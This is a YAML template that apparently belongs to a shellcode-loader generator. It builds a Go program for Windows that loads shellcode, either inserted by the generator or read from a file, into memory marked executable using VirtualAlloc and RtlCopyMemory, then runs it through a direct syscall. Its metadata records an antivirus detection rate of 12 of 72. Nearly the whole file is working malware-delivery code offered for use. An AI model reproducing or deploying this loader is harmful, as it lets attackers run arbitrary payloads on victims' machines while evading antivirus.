name: Go-EXE-Windows-Null-Yes-Syscall
time: 1630944000
bypass: 12/72
language: go
build: ~
process: exe
set: 
  shellcode: Binary().String2GoArray(kwargs.get("shellcode"))#对数据进行类型转换
include:
  - "io/ioutil"
  - "os"
  - "syscall"
  - "unsafe"
state: 
  - |
    var (	
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")) 
define: 
  - |
    const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    )
class: ~
function:
  - |
    func checkErr(err error) {
    if err != nil {
    if err.Error() != "The operation completed successfully." {
    println(err.Error())
    os.Exit(1)}}}
  - |
    func main() {
    shellcode := []byte {{'{'}} {{shellcode}} {{'}'}}
    if len(os.Args) > 1 {
    shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
    checkErr(err)
    shellcode = shellcodeFileData}
    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
    checkErr(err)}
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    checkErr(err)
    syscall.Syscall(addr, 0, 0, 0, 0)}
